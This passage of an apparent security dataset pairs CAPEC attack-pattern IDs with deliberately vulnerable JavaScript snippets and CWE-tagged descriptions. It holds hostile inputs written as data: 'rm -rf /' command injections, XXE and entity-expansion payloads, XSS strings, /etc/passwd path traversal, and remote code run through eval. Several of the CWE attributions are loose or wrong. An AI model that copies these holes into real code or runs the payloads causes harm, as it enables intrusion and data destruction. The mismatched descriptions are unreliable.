        "description": "This code snippet demonstrates a vulnerable web server that allows an adversary to continually engage a specific resource, keeping it tied up and unavailable to legitimate users. The '/resource' endpoint returns a large JSON object that consumes a significant amount of memory, making it a prime target for resource exhaustion attacks. The lack of authorization checks (CWE-285) and uncontrolled resource consumption (CWE-400) enable an attacker to repeatedly request this resource, eventually leading to the exhaustion of available resources. Additionally, the absence of throttling or limits on resource allocation (CWE-770) and network message volume (CWE-406) allows an attacker to amplify the attack. The creation of an emergent resource (CWE-1229) through the repeated allocation of memory for the large JSON object further exacerbates the issue."
    },
    {
        "capec_id": "228",
        "code_snippet": "const parser = new DOMParser();\nconst xml = '<!DOCTYPE doc [\n  <!ENTITY xxe SYSTEM \"http://example.com/evil.dtd\">\n]>\n<doc>&xxe;</doc>'; \nconst xmlDoc = parser.parseFromString(xml, 'application/xml');\nconsole.log(xmlDoc);",
        "description": "This JavaScript code snippet demonstrates an XML External Entity (XXE) injection vulnerability. It creates an XML document with a malicious DTD that references an external entity from an untrusted control sphere. The parser then processes the XML document, allowing the attacker to inject malicious content, potentially leading to resource depletion or arbitrary file access."
    },
    {
        "capec_id": "229",
        "code_snippet": "const xml2js = require('xml2js');\n\nconst parser = new xml2js.Parser();\n\nconst maliciousXml = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY a \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n  <!ENTITY b \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\">\n  <!ENTITY c \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\">\n  <!ENTITY d \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\">\n  ...\n  <!ENTITY y \"&z;&z;&z;&z;&z;&z;&z;&z;&z;&z;\">\n  <!ENTITY z \"\">\n]>\n<foo>&a;</foo>`;\n\nparser.parseString(maliciousXml, (err, result) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(result);\n  }\n});",
        "description": "This code snippet demonstrates a denial of service attack by exploiting a vulnerable XML parser. The malicious XML file contains a large number of nested entity references, which can cause the parser to consume excessive CPU resources and eventually crash. This is an example of CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-611 (Improper Restriction of XML External Entity Reference)."
    },
    {
        "capec_id": "230",
        "code_snippet": "const yaml = require('js-yaml');\nconst xmljs = require('xml-js');\n\nconst untrustedYamlInput = '{a: !<tag:yaml.org,2002:js/undefined> []}\n{a: !<tag:yaml.org,2002:js/undefined> []}\n{a: !<tag:yaml.org,2002:js/undefined> []}\n...'; // attacker-controlled YAML input\n\nconst untrustedXmlInput = '<!ENTITY a \"<&b;>\"><!ENTITY b \"<&c;>\"><!ENTITY c \"<&d;>\"><!ENTITY d \"<&e;>\">...<root><a/></root>'; // attacker-controlled XML input\n\ntry {\n  const yamlParsed = yaml.safeLoad(untrustedYamlInput);\n  console.log(yamlParsed);\n} catch (e) {\n  console.error(e);\n}\n\ntry {\n  const xmlParsed = xmljs.xml2js(untrustedXmlInput, {compact: true});\n  console.log(xmlParsed);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This code snippet demonstrates the CAPEC of exploiting parser vulnerabilities through untrusted input. The YAML and XML parsers are used to process attacker-controlled input, which can lead to excessive memory consumption and CPU utilization due to uncontrolled recursion and lack of input validation. The CWEs embodied in this code snippet include CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), CWE-770 (Allocation of Resources Without Limits or Throttling), and CWE-1102 (Reliance on Machine-Dependent Data Representation)."
    },
    {
        "capec_id": "231",
        "code_snippet": "function parseXML(xmlString) {\n  var parser = new DOMParser();\n  var xmlDoc = parser.parseFromString(xmlString, \"text/xml\");\n  var elements = xmlDoc.getElementsByTagName(\"*\");\n  for (var i = 0; i < elements.length; i++) {\n    var element = elements[i];\n    var childNodes = element.childNodes;\n    for (var j = 0; j < childNodes.length; j++) {\n      var childNode = childNodes[j];\n      if (childNode.nodeType === 3) {\n        var textContent = childNode.textContent;\n        if (textContent.length > 10000) {\n          // Oversized data payload\n          var oversizedData = new Array(textContent.length);\n          for (var k = 0; k < oversizedData.length; k++) {\n            oversizedData[k] = k;\n          }\n          // Uncontrolled recursion\n          function recursiveFunction() {\n            oversizedData.push(recursiveFunction);\n            return recursiveFunction;\n          }\n          recursiveFunction();\n        }\n      }\n    }\n  }\n}\n\n// Example usage:\nvar xmlString = '<root><element>oversized data payload</element></root>';\nparseXML(xmlString);",
        "description": "This code snippet demonstrates the CAPEC of injecting oversized serialized data payloads into a parser, leading to adverse effects such as exhausting system resources and potential arbitrary code execution. The code lacks XML validation (CWE-112), input validation (CWE-20), and control over recursion (CWE-674), allowing an attacker to inject oversized data payloads. Additionally, the code allocates resources without limits or throttling (CWE-770) and relies on machine-dependent data representation (CWE-1102), making it vulnerable to exploitation."
    },
    {
        "capec_id": "233",
        "code_snippet": "const adminRole = { canEdit: true, canDelete: true }; const userRole = { canEdit: false, canDelete: false }; function elevatePrivileges(role) { if (role === 'admin') { return adminRole; } else { return userRole; } } function performAction(role, action) { if (action === 'edit' && role.canEdit) { console.log('Editing...'); } else if (action === 'delete' && role.canDelete) { console.log('Deleting...'); } else { console.log('Access denied.'); } } const userInput = 'admin'; const userAction = 'delete'; const userRoleObject = elevatePrivileges(userInput); performAction(userRoleObject, userAction);",
        "description": "This code snippet demonstrates the CAPEC of privilege escalation. The elevatePrivileges function is supposed to assign the correct role to the user based on their input, but it does not properly check the user's privileges. An attacker can exploit this by inputting 'admin' as their role, which would grant them elevated privileges and allow them to perform actions they are not supposed to be authorized to perform. This code relates to CWE-269, CWE-653, CWE-274, CWE-1264, and CWE-1311."
    },
    {
        "capec_id": "234",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction vulnerableFunction() {\n  const userInput = 'rm -rf /'; // assume this comes from an untrusted source\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\nvulnerableFunction();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of gaining control of a process with elevated privileges to execute arbitrary code. The code uses the child_process module to execute a user-input command with elevated privileges, violating CWE-114 by executing a command from an untrusted source. Additionally, it does not drop privileges before passing control of the resource to an untrusted actor, violating CWE-271. The code also executes the command with unnecessary privileges, violating CWE-250. Furthermore, it incorrectly assigns permissions for a critical resource, violating CWE-732, and uses privileged APIs incorrectly, violating CWE-648."
    },
    {
        "capec_id": "235",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nlet adminAccess = false;\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    adminAccess = true;\n    res.send('Login successful');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/adminPanel', (req, res) => {\n  if (adminAccess) {\n    res.send('Welcome to admin panel');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be exploited using capture-replay attacks (CWE-294). The adminAccess flag is stored in a static variable, making it accessible across threads (CWE-1058). An attacker can sniff the network traffic, capture the login request, and replay it to gain unauthorized access to the admin panel. The code also lacks proper access control for the IOCTL (CWE-782) and has a state synchronization error (CWE-373), making it vulnerable to race conditions."
    },
    {
        "capec_id": "236",
        "code_snippet": "const net = require('net');\nconst signal = require('signal');\n\nlet server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-294: Authentication Bypass by Capture-replay\n    // Replaying captured authentication data to bypass authentication\n    let authData = data.toString();\n    if (authData.includes('username') && authData.includes('password')) {\n      // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n      // Signal handler with non-asynchronous-safe code\n      process.on('SIGUSR1', () => {\n        console.log('Signal received');\n        // CWE-782: Exposed IOCTL with Insufficient Access Control\n        // IOCTL with unrestricted access\n        let ioctl = require('ioctl');\n        ioctl.doSomethingSensitive();\n      });\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-592: DEPRECATED: Authentication Bypass Issues\n// CWE-391: Unchecked Error Condition\n// Ignoring exceptions and error conditions\ntry {\n  server.emit('error', new Error('Test error'));\n} catch (e) {\n  // Ignore the error\n}\n",
        "description": "This code snippet demonstrates a deprecated attack pattern that combines multiple vulnerabilities. It includes a capture-replay authentication bypass, a signal handler with non-asynchronous-safe code, an exposed IOCTL with insufficient access control, and ignored exceptions and error conditions. Note that this code is for educational purposes only and should not be used in production."
    },
    {
        "capec_id": "237",
        "code_snippet": "java.lang.Runtime.getRuntime().exec(\"/bin/bash -c 'whoami' > /tmp/output\");",
        "description": "This Java code snippet demonstrates the CAPEC of escaping a sandbox by calling native C code through the Java Native Interface (JNI), which is a protection mechanism failure (CWE-693). The code uses the Runtime class to execute a system call, which is an unsafe operation that can expose the application to weaknesses in the native code (CWE-111). The code also contains sensitive information in the form of a system call, which can be leveraged by an attacker to gain unauthorized access to the system (CWE-537). Additionally, the use of inner classes containing sensitive data (CWE-492) and exposure of sensitive information caused by incorrect data forwarding during transient execution (CWE-1422) are also relevant in this context."
    },
    {
        "capec_id": "238",
        "code_snippet": "const isAdmin = true;\n\nfunction authorize(url) {\n  if (isAdmin) {\n    return true;\n  }\n  const urlParts = url.split('/');\n  if (urlParts[1] === 'admin') {\n    return false;\n  }\n  return true;\n}\n\nfunction parseUrl(url) {\n  const urlParts = url.split('/');\n  if (urlParts[1] === 'admin') {\n    return 'admin dashboard';\n  } else {\n    return 'user dashboard';\n  }\n}\n\nconst userInput = 'http://example.com/../admin/dashboard';\nif (authorize(userInput)) {\n  console.log(parseUrl(userInput));\n}",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves incorrect behavior order of authorization before parsing and canonicalization. The authorize function checks for admin access before parsing the URL, allowing an attacker to bypass authorization by manipulating the URL. The parseUrl function is also vulnerable to path traversal attacks. The code also exhibits CWE-670 (Always-Incorrect Control Flow Implementation) and CWE-424 (Improper Protection of Alternate Path) due to the flawed authorization and parsing logic."
    },
    {
        "capec_id": "239",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/protected-resource', (req, res) => {\n  if (req.query.authenticated === 'true') {\n    res.send('Access granted.');\n  } else {\n    res.status(401).send('Unauthorized.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000.');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that relies on client-side authentication. The server trusts the client to send an 'authenticated' query parameter, which can be easily tampered with by an attacker. This is an example of CWE-603: Use of Client-Side Authentication and CWE-602: Client-Side Enforcement of Server-Side Security. An attacker can bypass the authentication check by modifying the client-side code to send 'authenticated=true' in the query parameter, allowing unauthorized access to the protected resource."
    },
    {
        "capec_id": "240",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../../../../etc/passwd';\nfs.readFile(userInput, 'utf8', (err, data) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  console.log(data);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting weaknesses in input validation by manipulating resource identifiers, enabling the unintended modification or specification of a resource. The code uses the 'fs' module to read a file specified by user input, without properly validating the input. This allows an attacker to provide a malicious path, such as '../../../../etc/passwd', to access sensitive files outside the intended sphere of control, illustrating CWEs 99, 1285, 1289, 913, and 20."
    },
    {
        "capec_id": "241",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.bodyParser()); // DEPRECATED: Use of Obsolete Function (CWE-477)\n\nconst userController = require('./userController');\n\napp.post('/login', userController.login);\n\nfunction login(req, res) {\n  const username = req.body.username;\n  const password = req.body.password;\n  const user = db.getUserByUsername(username);\n  if (user && user.password === password) {\n    req.session.isLoggedIn = true;\n    res.redirect('/home');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n}\n\nconst db = require('./db');\n\nfunction getUserByUsername(username) {\n  const query = \"SELECT * FROM users WHERE username = '\" + username + \"';\";\n  // DEPRECATED: Code Injection (CAPEC-242, CWE-592)\n  db.query(query, function(err, results) {\n    if (err) {\n      console.error(err);\n    } else {\n      return results[0];\n    }\n  });\n}",
        "description": "This code snippet demonstrates a deprecated code injection vulnerability (CAPEC-242, CWE-592) in a Node.js application. The code uses an obsolete function (CWE-477) and is vulnerable to code injection due to the concatenation of user input into a SQL query string. The code also lacks proper input validation and sanitization, making it susceptible to authentication bypass issues (CWE-592)."
    },
    {
        "capec_id": "242",
        "code_snippet": "const userInput = \"'); alert('Vulnerable');(\"; const maliciousCode = \"<script>eval(\"\" + userInput + \"\")</script>\"; document.body.innerHTML = maliciousCode;",
        "description": "This JavaScript code snippet demonstrates code injection vulnerability (CWE-94) by constructing a code segment using user input without proper validation or neutralization of special elements. The userInput variable contains malicious code that is injected into the eval() function, allowing an attacker to execute arbitrary code. This code also relates to CWE-506 (Embedded Malicious Code), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-1173 (Improper Use of Validation Framework), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "243",
        "code_snippet": "const userInput = '<a href=\"javascript:alert(1)\" style=\"background-image: url(javascript:alert(2))\">Click me!</a>'; document.body.innerHTML = userInput;",
        "description": "This code snippet demonstrates a cross-site scripting (XSS) vulnerability. It takes user input and injects it directly into the HTML of the page without proper sanitization, allowing an attacker to inject malicious JavaScript code. The userInput variable contains an anchor tag with a malicious JavaScript code in the href and style attributes, which will be executed when the page is rendered."
    },
    {
        "capec_id": "244",
        "code_snippet": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me!</a>",
        "description": "This code snippet demonstrates a cross-site scripting (XSS) vulnerability. The anchor tag's href attribute contains a base64 encoded HTML content with an embedded script that will execute an alert box with 'XSS' when clicked. This is possible due to improper neutralization of script in attributes, encoded URI schemes, and user-controllable input."
    },
    {
        "capec_id": "245",
        "code_snippet": "const userInput = \"<<script>alert('XSS')</script>>\";\nconst vulnerableApp = (input) => {\n  const html = `<div>${input}</div>`;\n  document.body.innerHTML = html;\n};\nvulnerableApp(userInput);",
        "description": "This code snippet demonstrates a vulnerable web application that fails to properly neutralize script-related HTML tags, allowing an adversary to bypass input validation using doubled characters and perform a cross-site scripting attack."
    },
    {
        "capec_id": "246",
        "code_snippet": "const userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nconst denylist = ['<script>', '<iframe>'];\nlet sanitizedInput = userInput;\nfor (let i = 0; i < denylist.length; i++) {\n  sanitizedInput = sanitizedInput.replace(denylist[i], '');\n}\ndocument.getElementById('user-input').innerHTML = sanitizedInput;",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to Stored XSS attacks. It uses an incomplete denylist to filter user-controlled input, allowing XSS variants to succeed. The code also fails to neutralize alternate script syntax and does not filter user-controlled input for executable script disguised using doubling of the involved characters. Additionally, it does not neutralize scripting elements within attributes of HTML IMG tags."
    },
    {
        "capec_id": "247",
        "code_snippet": "const userInput = \"<script>alert('XSS')</script>\r\n\"; const filteredInput = userInput.replace(/<|>|&/g, ''); document.getElementById('userInput').innerHTML = filteredInput;",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to XSS attacks due to improper neutralization of invalid characters in identifiers. The userInput variable contains malicious script tags, and the replace function is used to remove '<', '>', and '&' characters. However, the carriage return character ('\r\n') is not filtered, allowing the malicious script to be executed when the innerHTML property is set."
    },
    {
        "capec_id": "248",
        "code_snippet": "const userInput = \"& rm -rf /\";\nconst command = `git ${userInput} > output.txt`;\nconst child = require('child_process').exec(command);\nchild.stdout.on('data', (data) => {\n  console.log(`stdout: ${data}`);\n});",
        "description": "This code snippet demonstrates command injection vulnerability. The 'userInput' variable is not sanitized, allowing an attacker to inject malicious commands. The 'git' command is constructed using the user input, which can lead to unintended consequences, such as deleting files on the system."
    },
    {
        "capec_id": "249",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction executeCommand(userInput) {\n  const command = `ping ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage:\nexecuteCommand('google.com; rm -rf /');",
        "description": "This code snippet demonstrates command injection vulnerability (CWE-78) by constructing an OS command using user input without proper sanitization. An attacker can inject malicious commands, such as deleting files, by providing input like 'google.com; rm -rf /'. This code also relates to CWE-77 (Command Injection) and CWE-74 (Injection) as it fails to neutralize special elements in the input."
    },
    {
        "capec_id": "250",
        "code_snippet": "const xpath = require('xpath');\nconst xmldoc = require('xmldoc');\n\nfunction getDataFromXml(xmlString, xpathQuery) {\n  const xmlDoc = new xmldoc.XmlDocument(xmlString);\n  const nodes = xpath.select(xpathQuery, xmlDoc);\n  return nodes;\n}\n\nconst xmlString = '<users><user><name>John</name><password>password123</password></user></users>';\nconst userInput = '//*|//*'; // user-controllable input\nconst xpathQuery = '/users/user[' + userInput + ']';\n\nconst result = getDataFromXml(xmlString, xpathQuery);\nconsole.log(result);",
        "description": "This JavaScript code snippet demonstrates XML injection vulnerability. It uses the xpath and xmldoc libraries to parse an XML string and execute an XPath query. The XPath query is constructed dynamically using user-controllable input, which allows an attacker to inject malicious XPath expressions and access unauthorized data or modify the XML database."
    },
    {
        "capec_id": "251",
        "code_snippet": "const fs = require('fs');\nconst path = './library.js';\n\nif (fs.existsSync(path)) {\n  const lib = require(path);\n  lib.init();\n} else {\n  console.log('Library not found.');\n}\n\n// Global variable\nvar globalConfig = {\n  'debug': true\n};\n\nfunction init() {\n  if (globalConfig.debug) {\n    // Dynamically load code from local machine\n    const code = fs.readFileSync('./dynamicCode.js', 'utf8');\n    eval(code);\n  }\n}\n\ninit();",
        "description": "This code snippet demonstrates the CAPEC of forcing an application to load arbitrary code files from the local machine. It uses the CWEs of Inclusion of Functionality from Untrusted Control Sphere (CWE-829) by loading a local library file, Excessive Reliance on Global Variables (CWE-1108) with the globalConfig variable, and Improper Control of Dynamically-Managed Code Resources (CWE-913) by dynamically loading code from a file. The code also has a potential for Embedded Malicious Code (CWE-506) and Reliance on Machine-Dependent Data Representation (CWE-1102) due to the use of eval() and machine-dependent file paths."
    },
    {
        "capec_id": "252",
        "code_snippet": "let userInput = \"../../../../../../../../etc/passwd\";\n\nlet fs = require(\"fs\");\nlet vm = require(\"vm\");\n\nfs.readFile(userInput, function(err, data) {\n    if (err) {\n        console.error(err);\n    } else {\n        vm.runInThisContext(data, userInput);\n    }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of loading and executing an arbitrary local PHP file on a target machine. It uses the CWEs of Inclusion of Functionality from Untrusted Control Sphere (CWE-829), Improper Control of Filename for Include/Require Statement in PHP Program (CWE-98), Reliance on File Name or Extension of Externally-Supplied File (CWE-646), Incomplete Identification of Uploaded File Variables (CWE-616), and PHP External Variable Modification (CWE-473) by allowing user input to control the file to be executed, without proper validation or sanitization. This can lead to arbitrary code execution and other security vulnerabilities."
    },
    {
        "capec_id": "253",
        "code_snippet": "const https = require('https');\n\nhttps.get('https://example.com/maliciousLibrary.js', (res) => {\n  let libraryCode = '';\n  res.on('data', (chunk) => {\n    libraryCode += chunk;\n  });\n  res.on('end', () => {\n    eval(libraryCode);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of loading arbitrary code files from a remote location. It uses the 'https' module to download a JavaScript file from a remote server and then executes the code using the 'eval' function, without verifying the origin or integrity of the code. This is a vulnerable pattern that can lead to the execution of malicious code, as described in CWEs 829, 494, 602, 540, and 506."
    },
    {
        "capec_id": "254",
        "code_snippet": "const parser = new DOMParser();\nconst xmlString = '<!DOCTYPE doc [<!ENTITY ent SYSTEM \"http://example.com/evil.dtd\">]><doc>&ent;</doc>'; \nconst xmlDoc = parser.parseFromString(xmlString, 'application/xml');\nconsole.log(xmlDoc);",
        "description": "This code snippet demonstrates CWE-827: Improper Control of Document Type Definition, CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion'), and the deprecated CAPEC pattern. It creates an XML document with a malicious DTD reference, which can lead to XML Entity Expansion attacks, information exposure, and other security issues."
    },
    {
        "capec_id": "256",
        "code_snippet": "function processSOAPRequest(soapRequest) {\n  var arrayLength = soapRequest.arrayLength;\n  var dataArray = new Array(arrayLength);\n  for (var i = 0; i < soapRequest.arrayLength; i++) {\n    dataArray[i] = soapRequest.data[i];\n  }\n  // Process the dataArray\n  processData(dataArray);\n}\n\nfunction processData(dataArray) {\n  var buffer = new Buffer(dataArray.length);\n  for (var i = 0; i < dataArray.length; i++) {\n    buffer.writeUInt8(dataArray[i], i);\n  }\n  // Use the buffer\n  useBuffer(buffer);\n}\n\nfunction useBuffer(buffer) {\n  // Assume buffer is a valid buffer\n  var data = '';\n  for (var i = 0; i < buffer.length; i++) {\n    data += String.fromCharCode(buffer.readUInt8(i));\n  }\n  console.log(data);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable SOAP request processor that is susceptible to a buffer overflow attack. The 'processSOAPRequest' function trusts the 'arrayLength' value from the SOAP request and uses it to allocate a buffer. However, if the actual length of the 'data' array exceeds the specified 'arrayLength', it can cause a buffer overflow when the 'processData' function writes the data to the buffer. The 'useBuffer' function then uses the buffer without checking its validity, making it vulnerable to a heap-based buffer overflow (CWE-122). This code embodies the CAPEC description and is related to CWE-805, CWE-130, CWE-806, and CWE-120."
    },
    {
        "capec_id": "257",
        "code_snippet": "const fs = require('fs');\nconst debugLog = fs.createWriteStream('debug.log', { flags: 'a' });\nconst serverLog = fs.createWriteStream('server.log', { flags: 'a' });\n\n// CWE-217: Data stored in plaintext, allowing modification\nconst userData = { username: 'admin', password: 'password123' };\nfs.writeFileSync('user_data.json', JSON.stringify(userData));\n\n// CWE-218: Data stored without confidentiality\nconst confidentialData = 'Top Secret Information';\nfs.writeFileSync('confidential_data.txt', confidentialData);\n\n// CWE-534 and CWE-533: Information exposure through debug and server log files\ndebugLog.write('Debug: ' + confidentialData + '\\n');\nserverLog.write('Server: ' + confidentialData + '\\n');\n\n// CWE-592: Authentication bypass issues\nconst authenticate = (username, password) => {\n  // No authentication logic, allowing bypass\n  return true;\n};",
        "description": "This code snippet demonstrates a deprecated CAPEC attack pattern, incorporating multiple CWEs. It includes storing data in plaintext, without confidentiality, and exposing sensitive information through debug and server log files. Additionally, it features an authentication bypass issue, allowing unauthorized access."
    },
    {
        "capec_id": "258",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed using a capture-replay attack (CWE-294). The server-side authentication is performed using a simple username and password check, and a cookie is set upon successful authentication. However, the authentication check is only performed on the client-side, allowing an attacker to modify the client code to omit the authentication check (CWE-603). Additionally, the code uses a non-ubiquitous API (CWE-589) and does not protect stored data from modification (CWE-217). An attacker can sniff the network traffic, capture the authentication request, and replay it to gain unauthorized access to the protected resource."
    },
    {
        "capec_id": "259",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    // Authentication check is only performed on the client-side\n    res.cookie('auth', 'true');\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    // No server-side authentication check is performed\n    res.send('Welcome to the protected area');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed using a capture-replay attack (CWE-294). The authentication check is only performed on the client-side, and the server trusts the client to set the 'auth' cookie. An attacker can sniff the network traffic, capture the request, and replay it to the server to gain unauthorized access to the protected area. Additionally, the code uses a non-ubiquitous API (CWE-589) by relying on the 'express' framework, which may not be available on all platforms. The code also lacks server-side authentication checks, making it vulnerable to authentication bypass issues (CWE-592)."
    },
    {
        "capec_id": "260",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Login successful');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed using a capture-replay attack (CWE-294). The authentication check is performed on the client-side, and the server-side authentication can be bypassed by modifying the client to omit the authentication check (CWE-603). Additionally, the code uses a non-ubiquitous API (CWE-589) and has information exposure through debug log files (CWE-534), making it vulnerable to various attacks."
    },
    {
        "capec_id": "261",
        "code_snippet": "const mysql = require('mysql');\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users', (req, res) => {\n  const query = `SELECT * FROM users WHERE name LIKE '%${req.query.name}%';`;\n  db.query(query, (err, rows) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send({ message: 'Error fetching users', error: err });\n    } else {\n      res.send(rows);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable API endpoint that retrieves users based on a provided name. The input is not properly validated, allowing an attacker to inject malicious SQL queries. The error handling also exposes sensitive information about the database environment. An attacker can exploit this vulnerability by sending crafted queries to extract sensitive data or infer information about the database structure."
    },
    {
        "capec_id": "263",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(file) {\n  const filePath = path.join('/uploads/', file);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      console.error(err);\n    } else {\n      const fileExtension = path.extname(file);\n      if (fileExtension === '.exe' || fileExtension === '.dll') {\n        // execute the file\n        require('child_process').exec(filePath);\n      } else {\n        // process the file contents\n        console.log(data.toString());\n      }\n    }\n  });\n}\n\n// assume 'file' is a user-uploaded file\nprocessFile(file);",
        "description": "This code snippet demonstrates a vulnerable file processing functionality. It allows users to upload files, and then executes the file if it has a .exe or .dll extension, or processes its contents otherwise. This code is vulnerable to multiple issues: it includes functionality from an untrusted control sphere (CWE-829), uses insecure temporary files (CWE-377), relies on file name or extension of externally-supplied file (CWE-646), and allows unrestricted upload of files with dangerous types (CWE-434). An attacker can exploit these vulnerabilities by uploading a malicious file, causing a denial of service, buffer overflow, or other security issues."
    },
    {
        "capec_id": "264",
        "code_snippet": "var GLOBAL_VAR = 'initial_value';\n\nfunction evaluateUserInput(input) {\n  var userScope = 'user_defined';\n  eval('GLOBAL_VAR = \\'' + input + '\\';');\n  console.log(GLOBAL_VAR);\n}\n\nfunction anotherFunction() {\n  var GLOBAL_VAR = 'another_value';\n  console.log(GLOBAL_VAR);\n}\n\nevaluateUserInput('evil_code');\nanotherFunction();",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which is a duplicate of CAPEC-13. It showcases CWE-95: Eval Injection by using user input in an eval() function, CWE-1126: Declaration of Variable with Unnecessarily Wide Scope by declaring GLOBAL_VAR in a wider scope than necessary, CWE-1107: Insufficient Isolation of Symbolic Constant Definitions by not centralizing the definition of GLOBAL_VAR, CWE-1106: Insufficient Use of Symbolic Constants by using literal constants, and CWE-1108: Excessive Reliance on Global Variables by relying on GLOBAL_VAR throughout the code."
    },
    {
        "capec_id": "265",
        "code_snippet": "let globalVariable = 'initialValue';\n\nfunction outerFunction() {\n  let outerVariable = 'outerValue';\n  function innerFunction() {\n    let innerVariable = 'innerValue';\n    eval('globalVariable = \\'hackedValue\\';');\n    console.log(window[outerVariable]);\n    console.log(window[innerVariable]);\n  }\n  innerFunction();\n}\nouterFunction();",
        "description": "This code snippet demonstrates excessive reliance on global variables and improper control of dynamically-identified variables. The globalVariable is declared at the top level and is modified within the innerFunction using eval(). The outerVariable and innerVariable are also accessed dynamically using the window object, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "266",
        "code_snippet": "const userInput = '{__proto__: {isAdmin: true}}';\nconst obj = {};\nObject.assign(obj, JSON.parse(userInput));\nif (obj.isAdmin) {\n  console.log('User is admin');\n} else {\n  console.log('User is not admin');\n}\n\nconst dynamicCode = `let result = ${userInput};`;\neval(dynamicCode);\nconsole.log(result);\n",
        "description": "This code snippet demonstrates the deprecated attack pattern by showcasing multiple vulnerabilities. It first uses Object.assign() to merge user input with an object, which can lead to prototype pollution (CWE-915). Then, it uses eval() to execute dynamic code, which can lead to code injection (CWE-95). The code also lacks proper input validation and canonicalization, making it vulnerable to input manipulation (CWE-180). Additionally, the code relies on compiler optimizations, which can remove or modify security-critical code (CWE-733). Finally, the code stores user input in an object without proper access control, making it vulnerable to data modification (CWE-217)."
    },
    {
        "capec_id": "267",
        "code_snippet": "const userInput = '<script>alert(\"XSS\")</script>'; const encodedInput = encodeURIComponent(userInput); const decodedInput = decodeURIComponent(encodedInput); const filteredInput = decodedInput.replace(/<script>/gi, ''); const canonicalizedInput = filteredInput.toLowerCase(); if(canonicalizedInput === '<script>alert(\"xss\")</script>') { console.log('Valid input'); } else { console.log('Invalid input'); }",
